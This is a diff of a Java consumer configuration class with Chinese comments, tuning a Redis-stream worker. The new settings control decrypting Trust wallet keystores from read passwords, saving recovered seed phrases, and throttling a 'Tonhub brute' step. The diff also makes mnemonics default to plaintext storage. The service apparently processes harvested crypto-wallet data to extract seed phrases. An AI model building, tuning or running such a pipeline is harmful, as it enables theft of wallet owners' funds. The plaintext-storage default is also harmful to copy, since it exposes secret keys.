@@ -46,8 +46,8 @@ public class ConsumerProperties {
     /** DLQ 消息最长保留毫秒（默认 7 天），超期由 DLQ 清理线程批量删除 */
     private long dlqRetentionMs = 7L * 24 * 60 * 60 * 1000;
 
-    /** 助记词 AES 密钥（须与 news4 一致） */
-    private String mnemonicAesKey = "change_me_32bytes_key_xxxxxxxx";
+    /** 助记词 AES 密钥；空或未配置 → 明文入库（须与 news4 解密侧一致） */
+    private String mnemonicAesKey = "";
 
     /** 是否向 news4:tasks 投递 wallet_derive */
     private boolean news4TaskEnabled = true;
@@ -151,6 +151,34 @@ public class ConsumerProperties {
      * 多实例部署时可设为实例数，每实例 1 个许可。
      */
     private int tonhubBruteSerializePermits = 1;
+
+    /**
+     * Trust keystore scrypt 是否异步（默认 true）。
+     * true：读完密码/keystore 后丢后台解密，经 savePhraseLater 补写，不阻塞 parse_ci 墙钟。
+     * false：同步解密（便于排查）。
+     */
+    private boolean trustDecryptAsync = true;
+
+    /** Trust 异步解密线程数（默认 2；突发时不宜过大，避免与 parse 抢 CPU） */
+    private int trustDecryptThreads = 2;
+
+    /** 同时进行 Trust scrypt 的 device 上限（默认 2；3 实例合计约 6） */
+    private int trustDecryptSerializePermits = 2;
+
+    /**
+     * Poller 回压：worker 队列占用达到该比例则暂停 XREAD/XAUTOCLAIM（消息留在 Stream，不丢）。
+     * 默认 0.5；3 实例突发时防 PEL/Jedis 打满。
+     */
+    private double pollQueueHighRatio = 0.5;
+
+    /**
+     * Trust/Tonhub 拿不到串行许可时的延迟重试次数上限（默认 120）。
+     * 与 crypto-defer-base-delay-ms 组合：约数十分钟内持续重试，避免 ACK 后永久漏词。
+     */
+    private int cryptoDeferMaxAttempts = 120;
+
+    /** 延迟重试基础间隔 ms（默认 3000；第 n 次约 n*base，封顶 60s） */
+    private long cryptoDeferBaseDelayMs = 3000L;
 
     /** consumerName（用于 XREADGROUP/XCLAIM 的区分不同实例）；null 用 host */
     private String consumerName;
